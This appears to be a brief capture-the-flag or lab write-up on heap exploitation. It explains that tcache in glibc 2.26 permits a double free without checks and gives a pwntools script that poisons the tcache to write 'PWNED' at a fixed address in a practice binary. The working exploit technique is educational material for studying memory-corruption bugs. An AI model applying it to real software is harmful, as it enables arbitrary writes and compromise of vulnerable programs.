tcache in 2.26, when it is introduced, have even less security measure than fastbin, as we can free it twice in a row with no requirement, and when a tcache chunk is malloc'd, no size sanity check occured

with that, we can leverage a double free in our non PIE binary to point our to-be-malloc'd chunk to our target

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_dup")

context.binary = exe

def malloc(size, data):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("size:")
    r.sendline(str(size).encode())
    r.recvuntil("data:")
    r.send(data)

def free(index):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("index:")
    r.sendline(str(index).encode())

def main():
    global r

    # r=gdb.debug(exe.path)
    r = process(exe.path)

    filler=b"\x00"

    malloc(0x18,filler)
    free(0)
    free(0)

    malloc(0x18,flat(0x602010))
    malloc(0x18,filler)
    malloc(0x18,flat("PWNED",0))

    r.interactive()


if __name__ == "__main__":
    main()

```